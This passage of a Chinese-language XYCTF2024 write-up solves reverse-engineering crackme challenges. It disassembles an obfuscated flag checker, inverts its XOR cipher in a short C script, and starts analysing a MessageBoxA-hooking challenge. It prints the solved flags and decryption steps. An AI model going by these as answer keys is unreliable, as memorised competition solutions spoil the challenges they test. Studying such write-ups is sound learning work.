class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">.text:00005B722EBF7480 endbr64</span><br><span class="line">.text:00005B722EBF7484 push    r15</span><br><span class="line">.text:00005B722EBF7486 lea     rcx, sub_5B722EBF7540</span><br><span class="line">.text:00005B722EBF748D lea     rdx, sub_5B722EBF7560</span><br><span class="line">.text:00005B722EBF7494 mov     r15d, 2</span><br><span class="line">.text:00005B722EBF749A push    r14</span><br><span class="line">.text:00005B722EBF749C lea     r14d, [r15-1]</span><br><span class="line">.text:00005B722EBF74A0 push    r13</span><br><span class="line">.text:00005B722EBF74A2 lea     r13, ans</span><br><span class="line">.text:00005B722EBF74A9 push    r12</span><br><span class="line">.text:00005B722EBF74AB mov     r12, rdi</span><br><span class="line">.text:00005B722EBF74AE push    rbp</span><br><span class="line">.text:00005B722EBF74AF push    rbx</span><br><span class="line">.text:00005B722EBF74B0 sub     rsp, 38h</span><br><span class="line">.text:00005B722EBF74B4 mov     rax, fs:28h</span><br><span class="line">.text:00005B722EBF74BD mov     [rsp+68h+var_40], rax</span><br><span class="line">.text:00005B722EBF74C2 lea     rax, sub_5B722EBF74E8</span><br><span class="line">.text:00005B722EBF74C9 mov     [rsp+68h+var_60], rcx</span><br><span class="line">.text:00005B722EBF74CE lea     rcx, sub_5B722EBF7510</span><br><span class="line">.text:00005B722EBF74D5 mov     [rsp+68h+var_58], rdx</span><br><span class="line">.text:00005B722EBF74DA mov     [rsp+68h+var_50], rcx</span><br><span class="line">.text:00005B722EBF74DF mov     [rsp+68h+var_68], rax</span><br><span class="line">.text:00005B722EBF74E3 jmp     rax</span><br><span class="line">.text:00005B722EBF74E8 endbr64</span><br><span class="line">.text:00005B722EBF74EC mov     rdi, r12                        ; s</span><br><span class="line">.text:00005B722EBF74EF call    _strlen</span><br><span class="line">.text:00005B722EBF74EF</span><br><span class="line">.text:00005B722EBF74F4 cmp     rax, 30h ; &#x27;0&#x27;</span><br><span class="line">.text:00005B722EBF74F8 jnz     loc_5B722EBF7598</span><br><span class="line">.text:00005B722EBF74FE mov     rax, [rsp+r14*8+0]</span><br><span class="line">.text:00005B722EBF7502 add     r15d, 1</span><br><span class="line">.text:00005B722EBF7506 lea     r14d, [r15-1]</span><br><span class="line">.text:00005B722EBF750A jmp     rax</span><br><span class="line">.text:00005B722EBF7540 endbr64</span><br><span class="line">.text:00005B722EBF7544 mov     rax, [rsp+r14*8+0]</span><br><span class="line">.text:00005B722EBF7548 add     r15d, 1</span><br><span class="line">.text:00005B722EBF754C mov     ebp, 1</span><br><span class="line">.text:00005B722EBF7551 lea     r14d, [r15-1]</span><br><span class="line">.text:00005B722EBF7555 jmp     rax</span><br><span class="line">.text:00005B722EBF7560 endbr64</span><br><span class="line">.text:00005B722EBF7564 xor     ebx, ebx</span><br><span class="line">.text:00005B722EBF7566 db      2Eh</span><br><span class="line">.text:00005B722EBF7566 nop     word ptr [rax+rax+00000000h]</span><br><span class="line">.text:00005B722EBF7566</span><br><span class="line">.text:00005B722EBF7570</span><br><span class="line">.text:00005B722EBF7570 loc_5B722EBF7570:                       ; CODE XREF: sub_5B722EBF7560+31↓j</span><br><span class="line">.text:00005B722EBF7570 movzx   edi, byte ptr [r12+rbx]</span><br><span class="line">.text:00005B722EBF7575 mov     esi, ebx</span><br><span class="line">.text:00005B722EBF7577 call    enc</span><br><span class="line">.text:00005B722EBF7577</span><br><span class="line">.text:00005B722EBF757C cmp     [r13+rbx+0], al</span><br><span class="line">.text:00005B722EBF7581 setz    al</span><br><span class="line">.text:00005B722EBF7584 add     rbx, 1</span><br><span class="line">.text:00005B722EBF7588 movzx   eax, al</span><br><span class="line">.text:00005B722EBF758B and     ebp, eax</span><br><span class="line">.text:00005B722EBF758D cmp     rbx, 30h ; &#x27;0&#x27;</span><br><span class="line">.text:00005B722EBF7591 jnz     short loc_5B722EBF7570</span><br><span class="line">.text:00005B722EBF7591</span><br><span class="line">.text:00005B722EBF7593 jmp     loc_5B722EBF74FE</span><br><span class="line">.text:00005B722EBF74FE mov     rax, [rsp+r14*8+0]</span><br><span class="line">.text:00005B722EBF7502 add     r15d, 1</span><br><span class="line">.text:00005B722EBF7506 lea     r14d, [r15-1]</span><br><span class="line">.text:00005B722EBF750A jmp     rax</span><br><span class="line">.text:00005B722EBF7510 endbr64</span><br><span class="line">.text:00005B722EBF7514 xor     eax, eax</span><br><span class="line">.text:00005B722EBF7516 test    ebp, ebp</span><br><span class="line">.text:00005B722EBF7518 setz    al</span><br><span class="line">.text:00005B722EBF751B mov     rdx, [rsp+arg_20]</span><br><span class="line">.text:00005B722EBF7520 sub     rdx, fs:28h</span><br><span class="line">.text:00005B722EBF7529 jnz     short loc_5B722EBF75A2</span><br><span class="line">.text:00005B722EBF7529</span><br><span class="line">.text:00005B722EBF752B add     rsp, 38h</span><br><span class="line">.text:00005B722EBF752F pop     rbx</span><br><span class="line">.text:00005B722EBF7530 pop     rbp</span><br><span class="line">.text:00005B722EBF7531 pop     r12</span><br><span class="line">.text:00005B722EBF7533 pop     r13</span><br><span class="line">.text:00005B722EBF7535 pop     r14</span><br><span class="line">.text:00005B722EBF7537 pop     r15</span><br><span class="line">.text:00005B722EBF7539 retn</span><br></pre></td></tr></table></figure>
<p>整理一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">.text:00005B722EBF7480 endbr64</span><br><span class="line">.text:00005B722EBF7484 push    r15</span><br><span class="line">.text:00005B722EBF7486 lea     rcx, sub_5B722EBF7540</span><br><span class="line">.text:00005B722EBF748D lea     rdx, sub_5B722EBF7560</span><br><span class="line">.text:00005B722EBF7494 mov     r15d, 2</span><br><span class="line">.text:00005B722EBF749A push    r14</span><br><span class="line">.text:00005B722EBF749C lea     r14d, [r15-1]</span><br><span class="line">.text:00005B722EBF74A0 push    r13</span><br><span class="line">.text:00005B722EBF74A2 lea     r13, ans</span><br><span class="line">.text:00005B722EBF74A9 push    r12</span><br><span class="line">.text:00005B722EBF74AB mov     r12, rdi</span><br><span class="line">.text:00005B722EBF74AE push    rbp</span><br><span class="line">.text:00005B722EBF74AF push    rbx</span><br><span class="line">.text:00005B722EBF74B0 sub     rsp, 38h</span><br><span class="line">.text:00005B722EBF74B4 mov     rax, fs:28h</span><br><span class="line">.text:00005B722EBF74BD mov     [rsp+68h+var_40], rax</span><br><span class="line">.text:00005B722EBF74C2 lea     rax, sub_5B722EBF74E8</span><br><span class="line">.text:00005B722EBF74C9 mov     [rsp+68h+var_60], rcx</span><br><span class="line">.text:00005B722EBF74CE lea     rcx, sub_5B722EBF7510</span><br><span class="line">.text:00005B722EBF74D5 mov     [rsp+68h+var_58], rdx</span><br><span class="line">.text:00005B722EBF74DA mov     [rsp+68h+var_50], rcx</span><br><span class="line">.text:00005B722EBF74DF mov     [rsp+68h+var_68], rax</span><br><span class="line">.text:00005B722EBF74EC mov     rdi, r12                        ; s</span><br><span class="line">.text:00005B722EBF74EF call    _strlen</span><br><span class="line">.text:00005B722EBF754C mov     ebp, 1</span><br><span class="line">.text:00005B722EBF7564 xor     ebx, ebx</span><br><span class="line">.text:00005B722EBF7566</span><br><span class="line">.text:00005B722EBF7570</span><br><span class="line">.text:00005B722EBF7570 loc_5B722EBF7570:                       ; CODE XREF: sub_5B722EBF7560+31↓j</span><br><span class="line">.text:00005B722EBF7570 movzx   edi, byte ptr [r12+rbx]</span><br><span class="line">.text:00005B722EBF7575 mov     esi, ebx</span><br><span class="line">.text:00005B722EBF7577 call    enc</span><br><span class="line">.text:00005B722EBF7577</span><br><span class="line">.text:00005B722EBF757C cmp     [r13+rbx+0], al</span><br><span class="line">.text:00005B722EBF7581 setz    al</span><br><span class="line">.text:00005B722EBF7584 add     rbx, 1</span><br><span class="line">.text:00005B722EBF7588 movzx   eax, al</span><br><span class="line">.text:00005B722EBF758B and     ebp, eax</span><br><span class="line">.text:00005B722EBF758D cmp     rbx, 30h ; &#x27;0&#x27;</span><br><span class="line">.text:00005B722EBF7591 jnz     short loc_5B722EBF7570</span><br><span class="line">.text:00005B722EBF7514 xor     eax, eax</span><br><span class="line">.text:00005B722EBF7516 test    ebp, ebp</span><br><span class="line">.text:00005B722EBF7518 setz    al</span><br><span class="line">.text:00005B722EBF751B mov     rdx, [rsp+arg_20]</span><br><span class="line">.text:00005B722EBF7520 sub     rdx, fs:28h</span><br><span class="line">.text:00005B722EBF7529 jnz     short loc_5B722EBF75A2</span><br><span class="line">.text:00005B722EBF7529</span><br><span class="line">.text:00005B722EBF752B add     rsp, 38h</span><br><span class="line">.text:00005B722EBF752F pop     rbx</span><br><span class="line">.text:00005B722EBF7530 pop     rbp</span><br><span class="line">.text:00005B722EBF7531 pop     r12</span><br><span class="line">.text:00005B722EBF7533 pop     r13</span><br><span class="line">.text:00005B722EBF7535 pop     r14</span><br><span class="line">.text:00005B722EBF7537 pop     r15</span><br><span class="line">.text:00005B722EBF7539 retn</span><br></pre></td></tr></table></figure>
<p>合着挨个字符enc啊，字符串在r12里，每次和下标esi一起传入enc里，然后返回加密的字符和r13的字符串比较，这加密方式 有点难崩，不过还是可以把enc flag给提出来：</p>
<img src="/2024/04/26/XYCTF2024-Writeup/%E8%88%94%E7%8B%97%E5%9B%9B%E9%83%A8%E6%9B%B2_%E8%AE%B0%E5%BF%86%E7%9A%84%E6%97%B6%E5%85%89%E6%9C%BA_enc_flag.png" class title="舔狗四部曲_记忆的时光机_enc_flag">
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enc=[<span class="number">0x69</span>,<span class="number">0x58</span>,<span class="number">0x61</span>,<span class="number">0x63</span>,<span class="number">0x67</span>,<span class="number">0x4c</span>,<span class="number">0x4d</span>,<span class="number">0x32</span>,<span class="number">0x98</span>,<span class="number">0x20</span>,<span class="number">0x4d</span>,<span class="number">0x51</span>,<span class="number">0x7b</span>,<span class="number">0x25</span>,<span class="number">0x75</span>,<span class="number">0x51</span>,<span class="number">0xa3</span>,<span class="number">0x58</span>,<span class="number">0x60</span>,<span class="number">0x72</span>,<span class="number">0x42</span>,<span class="number">0x62</span>,<span class="number">0x67</span>,<span class="number">0x66</span>,<span class="number">0x37</span>,<span class="number">0x6c</span>,<span class="number">0x30</span>,<span class="number">0x46</span>,<span class="number">0x66</span>,<span class="number">0x4f</span>,<span class="number">0x5d</span>,<span class="number">0x03</span>,<span class="number">0x5d</span>,<span class="number">0xa4</span>,<span class="number">0x66</span>,<span class="number">0x01</span>,<span class="number">0x43</span>,<span class="number">0x68</span>,<span class="number">0x7d</span>,<span class="number">0x7c</span>,<span class="number">0x55</span>,<span class="number">0x4f</span>,<span class="number">0x7a</span>,<span class="number">0x3f</span>,<span class="number">0x6c</span>,<span class="number">0x12</span>,<span class="number">0x21</span>,<span class="number">0x09</span>]</span><br></pre></td></tr></table></figure>
<p>然后研究enc函数：</p>
<p>整理前：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">.text:00005A1A610BD360 endbr64</span><br><span class="line">.text:00005A1A610BD364 sub     rsp, 48h</span><br><span class="line">.text:00005A1A610BD368 lea     rcx, sub_5A1A610BD460</span><br><span class="line">.text:00005A1A610BD36F mov     edx, 2</span><br><span class="line">.text:00005A1A610BD374 movsxd  r10, esi</span><br><span class="line">.text:00005A1A610BD377 mov     rax, fs:28h</span><br><span class="line">.text:00005A1A610BD380 mov     [rsp+48h+var_10], rax</span><br><span class="line">.text:00005A1A610BD385 xor     eax, eax</span><br><span class="line">.text:00005A1A610BD387 lea     rax, sub_5A1A610BD448</span><br><span class="line">.text:00005A1A610BD38E mov     [rsp+48h+var_48], rcx</span><br><span class="line">.text:00005A1A610BD392 add     esi, 6</span><br><span class="line">.text:00005A1A610BD395 mov     [rsp+48h+var_40], rax</span><br><span class="line">.text:00005A1A610BD39A lea     rax, sub_5A1A610BD430</span><br><span class="line">.text:00005A1A610BD3A1 lea     r11, key                        ; &quot;i_have_get_shell_but_where_is_you_my_de&quot;...</span><br><span class="line">.text:00005A1A610BD3A8 mov     [rsp+48h+var_38], rax</span><br><span class="line">.text:00005A1A610BD3AD lea     rax, sub_5A1A610BD418</span><br><span class="line">.text:00005A1A610BD3B4 mov     [rsp+48h+var_30], rax</span><br><span class="line">.text:00005A1A610BD3B9 lea     rax, sub_5A1A610BD400</span><br><span class="line">.text:00005A1A610BD3C0 mov     [rsp+48h+var_28], rax</span><br><span class="line">.text:00005A1A610BD3C5 lea     rax, sub_5A1A610BD3E0</span><br><span class="line">.text:00005A1A610BD3CC mov     [rsp+48h+var_20], rax</span><br><span class="line">.text:00005A1A610BD3D1 lea     eax, [rdx-1]</span><br><span class="line">.text:00005A1A610BD3D4 jmp     rcx</span><br><span class="line">.text:00005A1A610BD460 endbr64</span><br><span class="line">.text:00005A1A610BD464 mov     rcx, [rsp+rax*8+0]</span><br><span class="line">.text:00005A1A610BD468 add     edx, 1</span><br><span class="line">.text:00005A1A610BD46B mov     r8d, edi</span><br><span class="line">.text:00005A1A610BD46E lea     eax, [rdx-1]</span><br><span class="line">.text:00005A1A610BD471 jmp     rcx</span><br><span class="line">.text:00005A1A610BD448 endbr64</span><br><span class="line">.text:00005A1A610BD44C mov     rcx, [rsp+rax*8+0]</span><br><span class="line">.text:00005A1A610BD450 xor     r8d, esi</span><br><span class="line">.text:00005A1A610BD453 add     edx, 1</span><br><span class="line">.text:00005A1A610BD456 xor     r8d, 66h</span><br><span class="line">.text:00005A1A610BD45A lea     eax, [rdx-1]</span><br><span class="line">.text:00005A1A610BD45D jmp     rcx</span><br><span class="line">.text:00005A1A610BD430 endbr64</span><br><span class="line">.text:00005A1A610BD434 mov     rcx, [rsp+rax*8+0]</span><br><span class="line">.text:00005A1A610BD438 add     edx, 1</span><br><span class="line">.text:00005A1A610BD43B sub     r8d, 6</span><br><span class="line">.text:00005A1A610BD43F lea     eax, [rdx-1]</span><br><span class="line">.text:00005A1A610BD442 jmp     rcx</span><br><span class="line">.text:00005A1A610BD418 endbr64</span><br><span class="line">.text:00005A1A610BD41C mov     rcx, [rsp+rax*8+0]</span><br><span class="line">.text:00005A1A610BD420 add     edx, 1</span><br><span class="line">.text:00005A1A610BD423 movzx   r9d, byte ptr [r11+r10]</span><br><span class="line">.text:00005A1A610BD428 lea     eax, [rdx-1]</span><br><span class="line">.text:00005A1A610BD42B jmp     rcx</span><br><span class="line">.text:00005A1A610BD400 endbr64</span><br><span class="line">.text:00005A1A610BD404 mov     rcx, [rsp+rax*8+0]</span><br><span class="line">.text:00005A1A610BD408 add     edx, 1</span><br><span class="line">.text:00005A1A610BD40B xor     r8d, r9d</span><br><span class="line">.text:00005A1A610BD40E lea     eax, [rdx-1]</span><br><span class="line">.text:00005A1A610BD411 jmp     rcx</span><br><span class="line">.text:00005A1A610BD3E0 endbr64</span><br><span class="line">.text:00005A1A610BD3E4 mov     rax, [rsp+arg_30]</span><br><span class="line">.text:00005A1A610BD3E9 sub     rax, fs:28h</span><br><span class="line">.text:00005A1A610BD3F2 jnz     short loc_5A1A610BD473</span><br><span class="line">.text:00005A1A610BD3F2</span><br><span class="line">.text:00005A1A610BD3F4 mov     eax, r8d</span><br><span class="line">.text:00005A1A610BD3F7 add     rsp, 48h</span><br><span class="line">.text:00005A1A610BD3FB retn</span><br></pre></td></tr></table></figure>
<p>整理后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">.text:00005A1A610BD360 endbr64</span><br><span class="line">.text:00005A1A610BD364 sub     rsp, 48h</span><br><span class="line">.text:00005A1A610BD368 lea     rcx, sub_5A1A610BD460</span><br><span class="line">.text:00005A1A610BD36F mov     edx, 2</span><br><span class="line">.text:00005A1A610BD374 movsxd  r10, esi</span><br><span class="line">.text:00005A1A610BD377 mov     rax, fs:28h</span><br><span class="line">.text:00005A1A610BD380 mov     [rsp+48h+var_10], rax</span><br><span class="line">.text:00005A1A610BD385 xor     eax, eax</span><br><span class="line">.text:00005A1A610BD387 lea     rax, sub_5A1A610BD448</span><br><span class="line">.text:00005A1A610BD38E mov     [rsp+48h+var_48], rcx</span><br><span class="line">.text:00005A1A610BD392 add     esi, 6</span><br><span class="line">.text:00005A1A610BD395 mov     [rsp+48h+var_40], rax</span><br><span class="line">.text:00005A1A610BD39A lea     rax, sub_5A1A610BD430</span><br><span class="line">.text:00005A1A610BD3A1 lea     r11, key                        ; &quot;i_have_get_shell_but_where_is_you_my_de&quot;...</span><br><span class="line">.text:00005A1A610BD3A8 mov     [rsp+48h+var_38], rax</span><br><span class="line">.text:00005A1A610BD3AD lea     rax, sub_5A1A610BD418</span><br><span class="line">.text:00005A1A610BD3B4 mov     [rsp+48h+var_30], rax</span><br><span class="line">.text:00005A1A610BD3B9 lea     rax, sub_5A1A610BD400</span><br><span class="line">.text:00005A1A610BD3C0 mov     [rsp+48h+var_28], rax</span><br><span class="line">.text:00005A1A610BD3C5 lea     rax, sub_5A1A610BD3E0</span><br><span class="line">.text:00005A1A610BD3CC mov     [rsp+48h+var_20], rax</span><br><span class="line">.text:00005A1A610BD46B mov     r8d, edi</span><br><span class="line">.text:00005A1A610BD450 xor     r8d, esi</span><br><span class="line">.text:00005A1A610BD456 xor     r8d, 66h</span><br><span class="line">.text:00005A1A610BD43B sub     r8d, 6</span><br><span class="line">.text:00005A1A610BD423 movzx   r9d, byte ptr [r11+r10]</span><br><span class="line">.text:00005A1A610BD40B xor     r8d, r9d</span><br><span class="line">.text:00005A1A610BD3E4 mov     rax, [rsp+arg_30]</span><br><span class="line">.text:00005A1A610BD3E9 sub     rax, fs:28h</span><br><span class="line">.text:00005A1A610BD3F2 jnz     short loc_5A1A610BD473</span><br><span class="line">.text:00005A1A610BD3F2</span><br><span class="line">.text:00005A1A610BD3F4 mov     eax, r8d</span><br><span class="line">.text:00005A1A610BD3F7 add     rsp, 48h</span><br><span class="line">.text:00005A1A610BD3FB retn</span><br></pre></td></tr></table></figure>
<p>其中rdi是输入的字符c，rsi是输入的下表i</p>
<p>那操作就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add esi, 6</span><br><span class="line">mov r8d,edi</span><br><span class="line">xor r8d,esi</span><br><span class="line">xor r8d,66h</span><br><span class="line">sub r8d, 6</span><br><span class="line">movzx r9d, byte ptr [key+rsi]</span><br><span class="line">xor r8d, r9d</span><br><span class="line">mov eax, r8d</span><br></pre></td></tr></table></figure>
<p>只要逆过来就是</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">r8d=enc^key[i]</span><br><span class="line">r8d=r8d+<span class="number">6</span></span><br><span class="line">r8d=r8d^<span class="number">0x66</span></span><br><span class="line">r8d=r8d^(i+<span class="number">6</span>)</span><br><span class="line">c=r8d</span><br></pre></td></tr></table></figure>
<p>因此写出脚本：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">uint8_t</span> enc[] = &#123;<span class="number">0x69</span>,<span class="number">0x58</span>,<span class="number">0x61</span>,<span class="number">0x63</span>,<span class="number">0x67</span>,<span class="number">0x4c</span>,<span class="number">0x4d</span>,<span class="number">0x32</span>,<span class="number">0x98</span>,<span class="number">0x20</span>,<span class="number">0x4d</span>,<span class="number">0x51</span>,<span class="number">0x7b</span>,<span class="number">0x25</span>,<span class="number">0x75</span>,<span class="number">0x51</span>,<span class="number">0xa3</span>,<span class="number">0x58</span>,<span class="number">0x60</span>,<span class="number">0x72</span>,<span class="number">0x42</span>,<span class="number">0x62</span>,<span class="number">0x67</span>,<span class="number">0x66</span>,<span class="number">0x37</span>,<span class="number">0x6c</span>,<span class="number">0x30</span>,<span class="number">0x46</span>,<span class="number">0x66</span>,<span class="number">0x4f</span>,<span class="number">0x5d</span>,<span class="number">0x03</span>,<span class="number">0x5d</span>,<span class="number">0xa4</span>,<span class="number">0x66</span>,<span class="number">0x01</span>,<span class="number">0x43</span>,<span class="number">0x68</span>,<span class="number">0x7d</span>,<span class="number">0x7c</span>,<span class="number">0x55</span>,<span class="number">0x4f</span>,<span class="number">0x7a</span>,<span class="number">0x3f</span>,<span class="number">0x6c</span>,<span class="number">0x12</span>,<span class="number">0x21</span>,<span class="number">0x09</span>&#125;;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span>* key = <span class="string">&quot;i_have_get_shell_but_where_is_you_my_dear_baby!!&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">48</span>;i++)&#123;</span><br><span class="line">		enc[i]=((enc[i]^key[i])+<span class="number">6</span>)^<span class="number">0x66</span>^(i+<span class="number">6</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,enc);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得到flag:flag{Br0k3n_m3m0r1es_for3v3r_Sh1n@_1n_The_H3@$T}</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">亲爱的：当你看到这个的时候，我想说我们是时候该分开了，嗯怎么说呢，我开始发现我们根本不是一个圈子的人，无论是哪个节假日，你都一个人守在电脑前看着所谓的赛，我。。。。其实。。。</span><br><span class="line">哎，对不起，我。。。这里一定存在修复好感情的方法，我要穿越时空，对，我要改变，我。。。我记得时空机的flag是：flag&#123;Br0k****,草，是啥？</span><br><span class="line">flag&#123;Br0k3n_m3m0r1es_for3v3r_Sh1n@_1n_The_H3@$T&#125;</span><br><span class="line">这么多年了，这个flag我早就记得了，我知道时空机压根不存在，这也只是我的幻想罢了，已经回不去了。。。（在你忙的时候别忘记陪陪那个你在乎的人，我失去过，我也尝试过，但是世上没有时空机）你拿到flag了，高兴点，你赢了</span><br></pre></td></tr></table></figure>
<p>太痛了啊</p>
<h3 id="舔狗四部曲–我的白月光">5.23. 舔狗四部曲–我的白月光</h3>
<img src="/2024/04/26/XYCTF2024-Writeup/%E8%88%94%E7%8B%97%E5%9B%9B%E9%83%A8%E6%9B%B2_%E6%88%91%E7%9A%84%E7%99%BD%E6%9C%88%E5%85%89_%E8%BF%90%E8%A1%8C.png" class title="舔狗四部曲_我的白月光_运行">
<p>那就逆向看看罢，这个程序好像一开始hook了MessageBoxA，改成了sub_7FF798211470，所以才会有那死循环弹窗：</p>
<img src="/2024/04/26/XYCTF2024-Writeup/%E8%88%94%E7%8B%97%E5%9B%9B%E9%83%A8%E6%9B%B2_%E6%88%91%E7%9A%84%E7%99%BD%E6%9C%88%E5%85%89_%E5%BC%B9%E7%AA%97.png" class title="舔狗四部曲_我的白月光_弹窗">
<p>那为啥这么做呢，因为他在上面刚解密了一第二部分flag（所以我才要动调啊 他那mm_load我看不懂啊）：</p>
<img src="/2024/04/26/XYCTF2024-Writeup/%E8%88%94%E7%8B%97%E5%9B%9B%E9%83%A8%E6%9B%B2_%E6%88%91%E7%9A%84%E7%99%BD%E6%9C%88%E5%85%89_%E5%86%85%E5%AD%98flag.png" class title="舔狗四部曲_我的白月光_内存flag">
<p>找到rsp也就能找到他留的信息了，把他提取出来：</p>
<img src="/2024/04/26/XYCTF2024-Writeup/%E8%88%94%E7%8B%97%E5%9B%9B%E9%83%A8%E6%9B%B2_%E6%88%91%E7%9A%84%E7%99%BD%E6%9C%88%E5%85%89_flag2.png" class title="舔狗四部曲_我的白月光_flag2">
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">please do not try to find her she do not belong to ago memories i will give you some flags:i8_a_k3y_and now go back please!</span><br></pre></td></tr></table></figure>
<p>啊这 我要是go back了就要往下看了哦~</p>
<img src="/2024/04/26/XYCTF2024-Writeup/%E8%88%94%E7%8B%97%E5%9B%9B%E9%83%A8%E6%9B%B2_%E6%88%91%E7%9A%84%E7%99%BD%E6%9C%88%E5%85%89_%E7%AE%97%E6%B3%95.png" class title="舔狗四部曲_我的白月光_算法">
<p>后面通过MessageBoxA手搓01可还行，而且说实话那个base64算法我到现在也没看懂，但是我动调找到规律了，</p>
<p>他依然是每4个b64后字符对应先前的3个字符，但是每4个b64字符都被reverse了一下，然后加密的字符串好像又被reverse了一下，总之靠着b64，from hex和reverse的排列组合，我把这段明文解出来了：</p>
<img src="/2024/04/26/XYCTF2024-Writeup/%E8%88%94%E7%8B%97%E5%9B%9B%E9%83%A8%E6%9B%B2_%E6%88%91%E7%9A%84%E7%99%BD%E6%9C%88%E5%85%89_%E6%98%8E%E6%96%87.png" class title="舔狗四部曲_我的白月光_明文">
